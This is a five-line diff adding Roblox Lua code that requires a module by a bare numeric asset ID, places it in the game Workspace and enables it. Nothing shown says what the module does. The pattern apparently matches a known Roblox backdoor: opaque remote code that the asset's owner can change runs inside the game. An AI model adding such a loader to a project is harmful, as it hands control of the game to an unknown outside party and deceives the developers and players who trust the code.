@@ -1,0 +1,5 @@
+local s = require(02988234157)
+if s ~= nil then
+  s.Parent = game.Workspace
+  s.Disabled = false
+end
